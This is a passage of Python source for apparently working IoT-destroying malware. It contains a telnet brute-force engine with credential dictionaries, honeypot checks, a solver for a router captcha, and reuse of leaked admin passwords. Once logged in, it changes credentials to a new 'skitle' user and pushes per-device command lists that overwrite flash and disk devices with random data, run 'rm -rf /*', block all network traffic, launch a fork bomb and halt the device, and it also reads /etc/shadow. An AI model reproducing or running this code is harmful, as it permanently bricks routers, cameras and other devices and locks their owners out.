		'cat /dev/urandom >/dev/mtdblock6 &', '', 
		'cat /dev/urandom >/dev/mtdblock7 &', '', 
		'cat /dev/urandom >/dev/hda1 &', '', 
		'cat /dev/urandom >/dev/hdb1 &', '', 
		'cat /dev/urandom >/dev/root &', '', 
		'cat /dev/urandom >/dev/ram0 &', '', 
		'cat /dev/urandom >/dev/mmcblk0 &', '', 
		'cat /dev/urandom >/dev/mmcblk0p1 &', '', 
		'route del default;iproute del default;rm -rf /* 2>/dev/null &', '',
		'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP', '%WAIT% ',
    'cat /dev/zero >>~/.HACKED;cat /dev/zero >>/tmp/.HACKED;cat /dev/zero >>/var/tmp/.HACKED &', '[#$>] ',
		'ifconfig en0 down;ifconfig en1 down;ifconfig en2 down;ifconfig eth0 down;ifconfig eth1 down;ifconfig eth2 down', '',
		'd(){ d|d & };d 2>/dev/null', '[#$>] ', 
		'sysctl -w net.ipv4.tcp_timestamps=0;sysctl -w kernel.threads-max=1', '%WAIT% ',
		'halt -n -f', '[#$>] ',
		'reboot', '[#$>] ',
		# try again just in case there was no dev null
		'd(){ d|d & };d', '%TERM%', 
	],

	# Generic catch-all for anything else
	[ "telnet", ".*", ".*",
		"cat /etc/shadow", '[#$>] ',
	],
]


# marker for splitting file into smaller parts for piecemeal parsing
splitvar = "SPLTX"


# task-specific structs
bruteforce_socks = []
bruteforce_ref = {}
bruteforce_master = {}
bruteforce_lastlog = {}		# full log of session
bruteforce_cmdlog = {}		# log of most recent command
bruteforce_loginstate = {}
bruteforce_pendingcmdbuf = {}
bruteforce_payloadtimeout = {}
bruteforce_connectiontime = {}
bruteforce_newuser = {}
bruteforce_newpass = {}
bruteforce_captcha = {}
bruteforce_extra = {}
# keep trying until totalattempts > maxattempts
# here are the main structs keeping track of the overall job
brutemaster_jobs = []
brutemaster_ref = {}
brutemaster_nextconnectiontime = {}
brutemaster_currentsock = {}
brutemaster_actionscript = {}
brutemaster_dictionaryindex = {}
brutemaster_dictionarybuf = {}
brutemaster_totalattempts = {}
brutemaster_login = {}

# lame ocr for lame bcom captcha
def bruteforce_bcomcharacter( parsematrix, maxx, maxy ):
	# fix padding
	for y in range(maxy):
		for x in range(maxx):
			if not x in parsematrix[y]:
				parsematrix[y][x] = ' '
#			print parsematrix[y][x],
#		print
	# transliterate rows into syntactical descriptors
	rbuf = []
	for y in range(maxy):
		has_char_left = 0
		has_char_right = 0
		has_char_middle = 0
		for x in range(maxx):
			if parsematrix[y][x] != ' ' and parsematrix[y][x] != '\t':
				if x == 0:
					has_char_left = 1
				if x == maxx-1:
					has_char_right = 1
				if x == int( (maxx-1) / 2 ):
					has_char_middle = 1
				if x == int( (maxx-1) / 2 ) + 1:
					has_char_middle = 1
		tlit = ""
		if has_char_left:
			tlit += 'L'
		if has_char_right:
			tlit += 'R'
		if has_char_middle:
			tlit += 'M'
		rbuf.append(tlit)
#		print "rbuf",tlit
	if rbuf[0] == 'LRM' and rbuf[maxy-1] == 'LRM' and rbuf[1] == 'LR' and rbuf[maxy-2] == 'LR' and rbuf[int((maxy-1)/2)] == 'LR' and rbuf[int((maxy-1)/2)+1] == 'LR':
		return "0"
	if rbuf[0] == 'M' and rbuf[maxy-1] == 'LRM' and rbuf[1] == 'M' and rbuf[maxy-2] == 'M':
		return "1"
	if rbuf[0] == 'LRM' and rbuf[maxy-1] == 'LRM' and rbuf[1] == 'R' and rbuf[maxy-2] == 'L':
		return "2"
	if rbuf[0] == 'LRM' and rbuf[maxy-1] == 'LRM' and rbuf[1] == 'R' and rbuf[maxy-2] == 'R':
		return "3"
	if rbuf[0] == 'LR' and rbuf[maxy-1] == 'R' and rbuf[1] == 'LR' and rbuf[maxy-2] == 'R':
		return "4"
	if rbuf[0] == 'LRM' and rbuf[maxy-1] == 'LRM' and rbuf[1] == 'L' and rbuf[maxy-2] == 'R':
		return "5"
	if rbuf[0] == 'LRM' and rbuf[maxy-1] == 'LRM' and rbuf[1] == 'L' and rbuf[maxy-2] == 'LR':
		return "6"
	if rbuf[0] == 'LRM' and rbuf[maxy-1] == 'R' and rbuf[1] == 'R' and rbuf[maxy-2] == 'R':
		return "7"
	if rbuf[0] == 'LRM' and rbuf[maxy-1] == 'LRM' and rbuf[1] == 'LR' and rbuf[maxy-2] == 'LR' and ( rbuf[int((maxy-1)/2)] == 'LRM' or rbuf[int((maxy-1)/2)+1] == 'LRM'):
		return "8"
	if rbuf[0] == 'LRM' and rbuf[maxy-1] == 'LRM' and rbuf[1] == 'LR' and rbuf[maxy-2] == 'R':
		return "9"
	return "-";					
					

# just to keep flakier devices from rebooting while parsing this					
time.sleep(3)

def bruteforce_bcomcaptcha( captcha ):
	val = ""
	cbuf = []
	for line in captcha.split( '\n' ):
		line = line.split( '\r' )[0]
		if '===========' in line:
			continue
		if re.search( '[A-Za-z]', line ):
			continue
		if not re.search( '\s.*\s.*\s.*\s.*\s.*\s.*\s.*\s.*\s.*\s', line ):
			continue
		cbuf.append(line)
	
	maxy = len(cbuf)
	if maxy < 5:
		return -1
	maxx = 0
	matrix = {}
	y = 0
	
	for line in cbuf:
		matrix[y] = {}
		x = 0
		for char in line:
			matrix[y][x] = char
			x += 1
		if x > maxx:
			maxx = x
		y += 1
		
	# pad short matrix rows
	for y in range(maxy):
		for x in range(maxx):
			if not x in matrix[y]:
				matrix[y][x] = ' '
	#		print matrix[y][x],
#		print
	
	whitespacebuf = {}
	for x in range(maxx):
		is_whitespace = 1
		for y in range(maxy):
			if matrix[y][x] != ' ' and matrix[y][x] != '\t':
				is_whitespace = 0
				break
			elif matrix[y][x] == ' ' or matrix[y][x] == '\t':
				pass
		whitespacebuf[x] = is_whitespace
		
	# now look for character-looking things to extract
	startcharindex = -1
	endcharindex = -1
	x = 0
	while ( x < maxx ):
		if whitespacebuf[x] == 0:
			startcharindex = x
			x += 1
			while x < maxx - 1:
				if whitespacebuf[x] == 1 and whitespacebuf[x + 1] == 1:
					# assume end of char if 2 consequtive whitespace columns
					endcharindex = x
					parsematrix = {}
					maxrx = 0
					for cy in range(maxy):
						parsematrix[cy] = {}
						rx = 0
						for cx in range(endcharindex-startcharindex):
							if whitespacebuf[cx + startcharindex] == 1:
								continue
							parsematrix[cy][rx] = matrix[cy][cx + startcharindex]
							rx += 1
						if rx > maxrx:
							maxrx = rx
					val += bruteforce_bcomcharacter( parsematrix, maxrx, maxy )
					startcharindex = -1
					endcharindex = -1
					break
				x += 1
		x += 1				
	return val

def brutemaster_create( targetip, targetport, bannerhint ):
	global bruteforce_maxattempts
	global bogushoneypotlogin
	global bruteforce_dictionary_specific
	global bruteforce_dictionary_prehoneypot
	if not execBR:
		return
	brutetuple = ( targetip, int(targetport ) )
	brutehash = hash( brutetuple )
	if brutehash in brutemaster_jobs:
		return
	brutemaster_dictionaryindex[brutehash] = 0
	brutemaster_dictionarybuf[brutehash] = []
	# 4/8 hack - test a bogus login to check for honeypot
	# 10/8 kludge - lame zte factory backdoor may accept any login! so skip
	# bogus login if port is 4719
	for case in bruteforce_dictionary_prehoneypot:
		if re.search( case[0], bannerhint ):
			brutemaster_dictionarybuf[brutehash] += case[1:]
	if targetport != 4719:
		brutemaster_dictionarybuf[brutehash].append( bogushoneypotlogin )
	for case in bruteforce_dictionary_specific:
		if re.search( case[0], bannerhint ):
			brutemaster_dictionarybuf[brutehash] += case[1:]
	# if specific is a long dict then we'll fill rest with random pws
	if len(brutemaster_dictionarybuf[brutehash]) > 7:
		while ( len( brutemaster_dictionarybuf[brutehash] ) < bruteforce_maxattempts ):
			brutemaster_dictionarybuf[brutehash].append(random.choice(bruteforce_dictionary_extra))
	else:
		# regular logic - use main dict and then fill
		brutemaster_dictionarybuf[brutehash] += bruteforce_dictionary_generic
		# fill rest of dictbuf with random stuff from our extra dict
		while ( len( brutemaster_dictionarybuf[brutehash] ) < bruteforce_maxattempts ):
			brutemaster_dictionarybuf[brutehash].append(random.choice(bruteforce_dictionary_extra))
	
	brutemaster_ref[brutehash] = ( targetip, int(targetport), bannerhint )
	brutemaster_nextconnectiontime[brutehash] = 0
	brutemaster_currentsock[brutehash] = None
	brutemaster_actionscript[brutehash] = ""
	brutemaster_totalattempts[brutehash] = 0
	brutemaster_login[brutehash] = ""
	brutemaster_jobs.append(brutehash)

def bruteforce_create( targetip, targetport, bannerhint, masterhash ):
	brutetuple = ( targetip, int(targetport ) )
	newsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	newsock.setblocking(0)
	try:
		newsock.connect(brutetuple)
	except:
		pass
	brutehash = hash( newsock )
	bruteforce_socks.append(newsock)
	bruteforce_ref[brutehash] = ( targetip, int(targetport), bannerhint )
	bruteforce_loginstate[brutehash] = 0
	# xiongmai ctrl port hack, have to push a linefeed
	if targetport == 9527:
		bruteforce_loginstate[brutehash] = -1
	bruteforce_pendingcmdbuf[brutehash] = []
	bruteforce_payloadtimeout[brutehash] = 0
	bruteforce_lastlog[brutehash] = ''
	bruteforce_cmdlog[brutehash] = ''
	bruteforce_connectiontime[brutehash] = time.time()
	bruteforce_newuser[brutehash] = ''
	bruteforce_newpass[brutehash] = ''
	bruteforce_captcha[brutehash] = 0
	bruteforce_extra[brutehash] = ''
	bruteforce_master[brutehash] = masterhash
	brutemaster_currentsock[masterhash] = newsock
	return newsock

def brutemaster_close( brutehash ):
	brutemaster_dictionaryindex[brutehash] = None
	brutemaster_dictionarybuf[brutehash] = None
	brutemaster_ref[brutehash] = None
	brutemaster_nextconnectiontime[brutehash] = None
	brutemaster_currentsock[brutehash] = None
	brutemaster_actionscript[brutehash] = None
	brutemaster_totalattempts[brutehash] = None
	brutemaster_login[brutehash] = None
	brutemaster_jobs.remove(brutehash)
	
def bruteforce_close( sock ):
	global bruteforce_maxattempts
	global bruteforce_waitbetweenattempts
	global showBR
	global showBL
	
	brutehash = hash(sock)
	try:
		sock.close()
	except:
		pass

	masterhash = bruteforce_master[brutehash]

  # TODO how to determine if this was successful? "protected" telnets will restart every second
  # maybe count bytes sent vs bytes received.. if we got at least 50% back it would be success?
  # Would it matter? We can just keep retrying anyway (e.g. device might reboot and have to be
  # redone)
		
	if bruteforce_loginstate[brutehash] >= 5 and ( showBR or showBL ):
		# we managed to log in - make note of it regardless of final result
		actionscript = brutemaster_actionscript[masterhash]
		if actionscript == 'honeypot' or actionscript == 'mtguest':
		  brutemaster_totalattempts[masterhash] = 9999
		if actionscript == '':
			actionscript = 'unknown'
		newlogin = ''
		if bruteforce_newuser[brutehash]:
			newlogin = bruteforce_newuser[brutehash] + '/'
		elif bruteforce_newpass[brutehash]:
			newlogin = brutemaster_login[masterhash].split('/')[0] + '/'
		if bruteforce_newpass[brutehash]:
			newlogin += bruteforce_newpass[brutehash] 
		lastlog = re.sub( '\r?\n', ';', bruteforce_lastlog[brutehash] )
		lastlog = re.sub( '[^A-Za-z0-9 \.,:;<>\(\)\[\]\-+%!@/#$=]', '', lastlog )
		if not showBL or actionscript == 'unknown' or actionscript == 'telnet':
			log_session( "%s:%d BR:%s:%s:%s:%s" %( brutemaster_ref[masterhash][0], brutemaster_ref[masterhash][1], actionscript, brutemaster_login[masterhash], newlogin, lastlog[:8192] ) );
		else:
			log_session( "%s:%d BR:%s:%s:%s:%s" %( brutemaster_ref[masterhash][0], brutemaster_ref[masterhash][1], actionscript, brutemaster_login[masterhash], newlogin, lastlog[:32] ) );
		
	# set master structs in accordance
	# here allow for a custom next-attempt time (e.g. in case we have a nag screen)
	curtime = time.time()
	if brutemaster_nextconnectiontime[masterhash] <= curtime:
		brutemaster_nextconnectiontime[masterhash] = time.time() + bruteforce_waitbetweenattempts
	brutemaster_currentsock[masterhash] = None
	brutemaster_totalattempts[masterhash] += 1
	if brutemaster_totalattempts[masterhash] >= bruteforce_maxattempts:
		# we are done
		brutemaster_close(masterhash)
  
	bruteforce_socks.remove(sock)
	bruteforce_ref[brutehash] = None
	bruteforce_loginstate[brutehash] = None
	bruteforce_pendingcmdbuf[brutehash] = None
	bruteforce_payloadtimeout[brutehash] = None
	bruteforce_lastlog[brutehash] = None
	bruteforce_cmdlog[brutehash] = None
	bruteforce_connectiontime[brutehash] = None
	bruteforce_newuser[brutehash] = None
	bruteforce_newpass[brutehash] = None
	bruteforce_captcha[brutehash] = None
	bruteforce_master[brutehash] = None
	bruteforce_extra[brutehash] = None
	
def brutemaster_update():
	curtime = time.time()
	for task in brutemaster_jobs:
		masterhash = hash(task)
		if brutemaster_currentsock[masterhash] == None:
			# time to create another socket?
			if curtime >= brutemaster_nextconnectiontime[masterhash]:
				# sure
				newsock = bruteforce_create( brutemaster_ref[masterhash][0], brutemaster_ref[masterhash][1], brutemaster_ref[masterhash][2], masterhash )
				brutemaster_currentsock[masterhash] = newsock
				brutemaster_nextconnectiontime[masterhash] = 0

def bruteforce_push_next_cmd( sock, brutehash, masterhash ):
	global bruteforce_payloadcmd_timeout

  # KLUDGE - open a secondary channel
	if 'Please use port 26 to telnet' in bruteforce_lastlog[brutehash]:
		# here we trigger a port 26 attempt and hack a %WAIT%
		brutemaster_create( brutemaster_ref[masterhash][0], 26, "PORT:26:Hax" )
		bruteforce_pendingcmdbuf[brutehash][1] = '%WAIT%'
		# hax on hax, also clear out the trigger
		bruteforce_lastlog[brutehash] = re.sub( "Please use port 26 to telnet", '(GPON shell state match)', bruteforce_lastlog[brutehash] )

	# KLUDGE - here we have to skip next step if ubee LAN was previously configured
	if 'cabhCdpServerRouter: 127.0.0.1' in bruteforce_lastlog[brutehash] and len( bruteforce_pendingcmdbuf[brutehash] ) > 2:
		bruteforce_pendingcmdbuf[brutehash] = bruteforce_pendingcmdbuf[brutehash][2:]
		bruteforce_lastlog[brutehash] = re.sub( "cabhCdpServerRouter: 127.0.0.1", '(already set)', bruteforce_lastlog[brutehash] )

	# safety check just in case, there are a few edge cases
	if len( bruteforce_pendingcmdbuf[brutehash] ) <= 1:
		# sequence complete
		bruteforce_payloadtimeout[brutehash] = time.time() + 10
		bruteforce_loginstate[brutehash] = 9
		try:
			sock.shutdown()
		except:
			pass
		bruteforce_pendingcmdbuf[brutehash] = ''
		return 0

	firsthit = True
	while bruteforce_pendingcmdbuf[brutehash][1] == '' or firsthit:
		
		if '%' in bruteforce_pendingcmdbuf[brutehash][0]:
			if '%OLDUSER%' in bruteforce_pendingcmdbuf[brutehash][0]:
				bruteforce_pendingcmdbuf[brutehash][0] = re.sub( '%OLDUSER%', brutemaster_login[masterhash].split('/')[0], bruteforce_pendingcmdbuf[brutehash][0] )
			if '%OLDPASS%' in bruteforce_pendingcmdbuf[brutehash][0]:
				bruteforce_pendingcmdbuf[brutehash][0] = re.sub( '%OLDPASS%', brutemaster_login[masterhash].split('/')[1], bruteforce_pendingcmdbuf[brutehash][0] )
			if '%NEWUSER%' in bruteforce_pendingcmdbuf[brutehash][0]:
				bruteforce_newuser[brutehash] = 'skitle'
				bruteforce_pendingcmdbuf[brutehash][0] = re.sub( '%NEWUSER%', 'skitle', bruteforce_pendingcmdbuf[brutehash][0] )
			if '%NEWPASS%' in bruteforce_pendingcmdbuf[brutehash][0]:
				if bruteforce_newpass[brutehash] == '':
					bruteforce_newpass[brutehash] = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678901234567890123456789') for i in range(8))
				bruteforce_pendingcmdbuf[brutehash][0] = re.sub( '%NEWPASS%', bruteforce_newpass[brutehash], bruteforce_pendingcmdbuf[brutehash][0] )
			if '%TARGETIP%' in bruteforce_pendingcmdbuf[brutehash][0]:
				bruteforce_pendingcmdbuf[brutehash][0] = re.sub( '%TARGETIP%', brutemaster_ref[masterhash][0], bruteforce_pendingcmdbuf[brutehash][0] )
			if '%TARGETPORT%' in bruteforce_pendingcmdbuf[brutehash][0]:
				bruteforce_pendingcmdbuf[brutehash][0] = re.sub( '%TARGETPORT%', '%d'%(brutemaster_ref[masterhash][1]), bruteforce_pendingcmdbuf[brutehash][0] )
			if '%RELAUNCH%' in bruteforce_pendingcmdbuf[brutehash][0]:
#				brutemaster_login[masterhash] = 'root/20080826'
				brutemaster_dictionarybuf[masterhash] = ['root/20080826','root/20080826','root/20080826']
				brutemaster_dictionaryindex[masterhash] = 0
				bruteforce_close(sock)
				return 0
			if '%RELAUNCH2%' in bruteforce_pendingcmdbuf[brutehash][0]:
				brutemaster_dictionarybuf[masterhash] = ['root/hikvision','root/hikvision',brutemaster_login[masterhash],brutemaster_login[masterhash]]
				brutemaster_dictionaryindex[masterhash] = 0
				bruteforce_close(sock)
				return 0
			
		linefeedseq = '\n'
		if bruteforce_extra[brutehash] == 'R':
			linefeedseq = '\r\n'
		try:
			sock.send( bruteforce_pendingcmdbuf[brutehash][0] + linefeedseq )
		except:
			pass
		if bruteforce_pendingcmdbuf[brutehash][1] == '':
			if len( bruteforce_pendingcmdbuf[brutehash] ) <= 2:
				# sequence complete
				bruteforce_payloadtimeout[brutehash] = time.time() + 10
				bruteforce_loginstate[brutehash] = 9
				try:
					sock.shutdown()
				except:
					pass
				bruteforce_pendingcmdbuf[brutehash] = ''
				return 0
			else:
				bruteforce_pendingcmdbuf[brutehash] = bruteforce_pendingcmdbuf[brutehash][2:]
		else:
			firsthit = False

	if len( bruteforce_pendingcmdbuf[brutehash] ) <= 0:
		return 0
		
	bruteforce_payloadtimeout[brutehash] = time.time() + bruteforce_payloadcmd_timeout
	bruteforce_cmdlog[brutehash] = ''	
	return 1
				
bfdebugtemp_ipcache	= {}

def bruteforce_update():
	global bruteforce_maxconnectiontime_login
	global bruteforce_maxconnectiontime_payload
	global bruteforce_fingerprinting_commands
	global bruteforce_payloadcmd_timeout
	global bfdebugtemp_ipcache
	
	curtime = time.time()

	# process sockets
	socktimeout = 0.01
	readable, writable, errored = select.select(bruteforce_socks, bruteforce_socks, [], socktimeout)
	for sock in bruteforce_socks:
		brutehash = hash(sock)
		try:
			sockopt = sock.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
		except:
			sockopt = -1
		if sockopt != 0:
			bruteforce_close( sock )
			continue
		if sock in readable:
			data = ''
			try:
				data = sock.recv(2048)
			except:
				pass
			# telnet handshake crap, at least MikroTik requires a reply
			try:
				for do in re.findall('\xff\xfd.', data ):		# IAC DO cmd
					sock.send('\xff\xfc'+do[2])		# IAC WONT cmd
				for will in re.findall('\xff\xfb.', data):	# IAC WILL cmd
					sock.send('\xff\xfe'+will[2])	# IAC DONT cmd
			except:
				pass
			if data:
				bruteforce_lastlog[brutehash] += data
				bruteforce_cmdlog[brutehash] += data
				if bruteforce_loginstate[brutehash] == 0:
					# waiting on login prompt
					# check for passwordless shell
					if ( '/sbin # ' in bruteforce_lastlog[brutehash] ) or ( 'BusyBox v' in bruteforce_lastlog[brutehash] and ( '# ' in bruteforce_lastlog[brutehash] or '$ ' in bruteforce_lastlog[brutehash] ) ) or ( 'Linux ' in bruteforce_lastlog[brutehash] and ( '# ' in bruteforce_lastlog[brutehash][-2:] or '$ ' in bruteforce_lastlog[brutehash][-2:] ) and not '##' in bruteforce_lastlog[brutehash] and not '$$' in  bruteforce_lastlog[brutehash] ):
						masterhash = bruteforce_master[brutehash] 
						bruteforce_loginstate[brutehash] = 5
#						brutemaster_actionscript[masterhash] = 'busybox'
						brutemaster_login[masterhash] = 'root/BUSYBOXBLANK'
						continue
					# port 9527 that has already been logged into?
					if ( 'admin$ ' in bruteforce_lastlog[brutehash] ):
						masterhash = bruteforce_master[brutehash]
						if ( brutemaster_ref[masterhash][1] == 9527 ):
							bruteforce_loginstate[brutehash] = 5
							brutemaster_login[masterhash] = 'admin/XIONGMAIBLANK'
							continue
					if ( 'Type ENTER to run terminal' in bruteforce_lastlog[brutehash] ) and ( 'D A T A C O M' in bruteforce_lastlog[brutehash] ):
						masterhash = bruteforce_master[brutehash] 
						bruteforce_loginstate[brutehash] = 5
						brutemaster_login[masterhash] = 'root/DATACOMBLANK'
						continue
					# broadcom captcha?
					if bruteforce_captcha[brutehash] == 0 and 'Please input the verification code:' in bruteforce_lastlog[brutehash]:
						val = ''
						try:
							val = bruteforce_bcomcaptcha( bruteforce_lastlog[brutehash] )
						except:
							log_session( "ERR: BCS crashed" )
							pass
						try:
							sock.send( val + '\n' )
						except:
							pass
						bruteforce_captcha[brutehash] = 1
					if 'to set your login password' in bruteforce_lastlog[brutehash] and 'passwd' in bruteforce_lastlog[brutehash] and 'root@' in bruteforce_lastlog[brutehash]:
						masterhash = bruteforce_master[brutehash] 
						bruteforce_loginstate[brutehash] = 5
						brutemaster_login[masterhash] = 'root/OPENWRTBLANK'
						continue
					if 'APPCOM:'  in bruteforce_lastlog[brutehash] or 'DEBUG avc:'  in bruteforce_lastlog[brutehash] or 'Polycom Command Shell'  in bruteforce_lastlog[brutehash]:
						# some loginless telephony thingy
						masterhash = bruteforce_master[brutehash] 
						bruteforce_loginstate[brutehash] = 5
						brutemaster_login[masterhash] = '<blank>/<blank>'
						continue
					if 'REINCARNA' in bruteforce_lastlog[brutehash] and 'Wifatch' in bruteforce_lastlog[brutehash]:
						# nothing else to do on this port, Wifatch: cancel whole job
						masterhash = bruteforce_master[brutehash] 
						bruteforce_close( sock )
						brutemaster_close( masterhash )
						continue
					if 'Command line is locked now' in bruteforce_lastlog[brutehash]:
						# nothing else to do on this port for now
						bruteforce_close( sock )
						continue
					if 'You have to wait' in bruteforce_lastlog[brutehash]:
						matches = re.search( 'You have to wait (\d+) min (\d+) sec', bruteforce_lastlog[brutehash] )
						if matches:
							# we have to try again in a while
							masterhash = bruteforce_master[brutehash] 
							minutes = int(matches.group(1))
							seconds = int(matches.group(2))
							brutemaster_nextconnectiontime[masterhash] = curtime + seconds + minutes * 60;
						bruteforce_close( sock )
						continue
					# check for login prompt
					if ':' in bruteforce_lastlog[brutehash] and ( 'Login' in bruteforce_lastlog[brutehash] or 'login' in bruteforce_lastlog[brutehash] or 'username' in bruteforce_lastlog[brutehash] or 'user name' in bruteforce_lastlog[brutehash] or 'Username' in bruteforce_lastlog[brutehash] or 'USERNAME' in bruteforce_lastlog[brutehash] or 'LOGIN' in bruteforce_lastlog[brutehash] ) or 'Account:' in bruteforce_lastlog[brutehash]:
						bruteforce_loginstate[brutehash] = 1
					# just in case unit asks for password straight away..
					if ':' in bruteforce_lastlog[brutehash] and ( 'assword' in bruteforce_lastlog[brutehash] or 'pass word' in bruteforce_lastlog[brutehash] ):
						bruteforce_loginstate[brutehash] = 3

				if bruteforce_loginstate[brutehash] == 2:
					# waiting on password prompt
					# first look for some weirdo devices which give us a root shell after login name
					if '# ' in bruteforce_lastlog[brutehash][-2:] or 't chdir to home directory' in bruteforce_lastlog[brutehash]:
						bruteforce_loginstate[brutehash] = 5
						masterhash = bruteforce_master[brutehash]
						tlogin = brutemaster_dictionarybuf[masterhash][brutemaster_dictionaryindex[masterhash]].split('/')[0]
						brutemaster_login[masterhash] = tlogin + '/SKIPPEDBLANK'
						continue						
					# now look for actual prompt
					if ':' in bruteforce_lastlog[brutehash] and ( 'assword' in bruteforce_lastlog[brutehash] or 'pass word' in bruteforce_lastlog[brutehash] ):
						bruteforce_loginstate[brutehash] = 3

				if bruteforce_loginstate[brutehash] == 4:
					# logged in, waiting on shell prompt
					if not 'Last login:' in bruteforce_cmdlog[brutehash] and ( 'incorrect' in bruteforce_cmdlog[brutehash] or 'Incorrect' in bruteforce_cmdlog[brutehash] or ( ':' in bruteforce_cmdlog[brutehash] and ( 'Login' in bruteforce_cmdlog[brutehash] or 'login' in bruteforce_cmdlog[brutehash] or 'username' in bruteforce_cmdlog[brutehash] or 'user name' in bruteforce_lastlog[brutehash] or 'Username' in bruteforce_cmdlog[brutehash] or 'USERNAME' in bruteforce_cmdlog[brutehash] or 'LOGIN' in bruteforce_cmdlog[brutehash] ) ) or 'unrecognized user' in bruteforce_cmdlog[brutehash] or "Invalid password" in bruteforce_cmdlog[brutehash] ):

						# mikrotik workaround - these can get misidentified as login fails due to log dump
						if not 'RouterOS' in bruteforce_cmdlog[brutehash] and not 'critical login failure for user' in bruteforce_cmdlog[brutehash] and not 'Completes the command' in bruteforce_cmdlog[brutehash] and not '[admin@' in bruteforce_cmdlog[brutehash]:
							masterhash = bruteforce_master[brutehash] 
							brutemaster_dictionaryindex[masterhash] += 1
							if brutemaster_dictionaryindex[masterhash] >= len( brutemaster_dictionarybuf[masterhash] ):
								brutemaster_dictionaryindex[masterhash] = 0
							bruteforce_close( sock )
							continue
						else:
							bruteforce_extra[brutehash] = 'R'
					# hack - some broadcom leak the admin password at login - if we aren't admin
					# and we see the leaked info, relogin with the admin creds.. 
					masterhash = bruteforce_master[brutehash] 
					if not 'admin/' in brutemaster_dictionarybuf[masterhash] and '________admin,' in bruteforce_cmdlog[brutehash]:
						matches = re.search( '__________admin,([^_]*)______', bruteforce_cmdlog[brutehash] )
						if matches:
							brutemaster_dictionarybuf[masterhash] = ['admin/'+matches.group(1)]
							log_session( 'NOTC: IP %s:%d -> retry with lc %s' % ( brutemaster_ref[masterhash][0], brutemaster_ref[masterhash][1], brutemaster_dictionarybuf[masterhash][0] ) )
							brutemaster_dictionaryindex[masterhash] = 0
							bruteforce_close( sock )
							continue
					tempsearchspan = bruteforce_cmdlog[brutehash][-40:]
					tempsearchextra = bruteforce_cmdlog[brutehash][-80:]
					if ( re.search( '[$%#>] $', tempsearchspan[-2:] ) and not 'assword>' in tempsearchspan[-10:] ) or 'Press enter key' in tempsearchspan or re.search( '\[\S+@\S*\] > ', tempsearchspan ) or '(config)>' in tempsearchspan or 'root[0m@[31m' in tempsearchspan or 'BusyBox v' in bruteforce_cmdlog[brutehash] or '? for help' in bruteforce_cmdlog[brutehash] or ': not found' in tempsearchspan or 'exit system' in tempsearchspan or ( 'User Access Verification' in bruteforce_lastlog[brutehash] and re.search( '[A-Z0-9a-z\-][#>]$', tempsearchspan[-2:] ) ) or 'Password expiration warning' in bruteforce_cmdlog[brutehash] or 'for a list of built-in commands' in tempsearchextra or 'step into administration terminal' in tempsearchextra or 'Incomplete command found at' in tempsearchextra or 'welcome to use cli' in bruteforce_cmdlog[brutehash] or ( 'Login authentication' in bruteforce_lastlog[brutehash] and re.search( '[A-Z0-9a-z]\>$', tempsearchspan[-2:] ) ) or 'Main menu' in bruteforce_cmdlog[brutehash] or '% Unrecognized command' in tempsearchspan or 'ATP>' in tempsearchspan or re.search( 'HG\d\S+>$', tempsearchspan ) or 'Last login: ' in tempsearchextra or 'Type ENTER to run terminal' in tempsearchspan:
						# looks like a login - push fingerprinter
						# TODO: race condition intercept - if we are pretty sure that the login is correct we should probably skip this stage and push the special
						brutemaster_login[masterhash] = brutemaster_dictionarybuf[masterhash][brutemaster_dictionaryindex[masterhash]];
						# we will also reset the dictionarybuf to this login/password only in case
						# we have to log in again
						brutemaster_dictionarybuf[masterhash] = [ brutemaster_login[masterhash] ]
						brutemaster_dictionaryindex[masterhash] = 0
						bruteforce_loginstate[brutehash] = 5
						
				if bruteforce_loginstate[brutehash] == 6:
					# here we need to try to figure out which script to use based on our 
					# lastlog as well in case our login-based search has not found anything
					# yet
					masterhash = bruteforce_master[brutehash] 
					
					actionscript = ''
					pendingcmd = ''
					
					if not actionscript:					
						for mitigation in bruteforce_router_mitigations:
							# mitigation[0] is actionscript label
							# mitigation[1] is login mask
							# mitigation[2] is lastlog mask
							if re.search( mitigation[1], brutemaster_login[masterhash] ) and re.search( mitigation[2], bruteforce_lastlog[brutehash] ):
							
								# for some types require that we have registered N prompts to ensure
								# there is enough data to make the call
								if mitigation[0] == 'linux' or mitigation[0] == 'telnet' or mitigation[0] == 'busybox' or mitigation[0] == 'freescale':
								  if bruteforce_lastlog[brutehash].count( '> ' ) < 6 and bruteforce_lastlog[brutehash].count( '# ' ) < 6 and bruteforce_lastlog[brutehash].count( '% ' ) < 6 and bruteforce_lastlog[brutehash].count( '$ ' ) < 6 and bruteforce_lastlog[brutehash].count( 'm]#' ) < 6:
								    continue
							
								# this is a match
								actionscript = mitigation[0]
								pendingcmd = mitigation[3:]
								break
								
					if actionscript:
						bruteforce_loginstate[brutehash] = 7
						brutemaster_actionscript[masterhash] = actionscript
						bruteforce_pendingcmdbuf[brutehash] = pendingcmd

						if not bruteforce_push_next_cmd( sock, brutehash, masterhash ):
							continue
						
				if bruteforce_loginstate[brutehash] == 7:
					# we are in payload mode - we read new data and write as needed

					if re.search(bruteforce_pendingcmdbuf[brutehash][1], bruteforce_cmdlog[brutehash]):
						bruteforce_pendingcmdbuf[brutehash] = bruteforce_pendingcmdbuf[brutehash][2:]
						masterhash = bruteforce_master[brutehash]
						if not bruteforce_push_next_cmd( sock, brutehash, masterhash ):
							continue
						
			else:
				bruteforce_close(sock)
				continue
		if sock in writable:
		
			# hack - special cases which require a line feed to get a prompt will be set state -1
			# just push a linefeed asap and go to normal state 0
			if bruteforce_loginstate[brutehash] == -1:
				try:
					sock.send( "\n" )
				except:
					bruteforce_close(sock)
					continue
				bruteforce_loginstate[brutehash] = 0
		
			if bruteforce_loginstate[brutehash] == 1:
				# expecting login
				masterhash = bruteforce_master[brutehash] 
				tlogin = ''
				if 'XXX:' in brutemaster_dictionarybuf[masterhash][brutemaster_dictionaryindex[masterhash]]:
					matches = re.search( 'XXX:([^:]+):', brutemaster_dictionarybuf[masterhash][brutemaster_dictionaryindex[masterhash]] )
					if matches:
						tlogin = matches.group( 1 )
				else:
					tlogin = brutemaster_dictionarybuf[masterhash][brutemaster_dictionaryindex[masterhash]].split('/')[0]
				lfseq = "\n"
				# hack to deal with C-Data EPONs
				if "rface for EPON System" in bruteforce_lastlog[brutehash]:
					lfseq = "\r\n"
				try:
					sock.send( tlogin + lfseq )
				except:
					bruteforce_close(sock)
					continue
				bruteforce_cmdlog[brutehash] = ''	
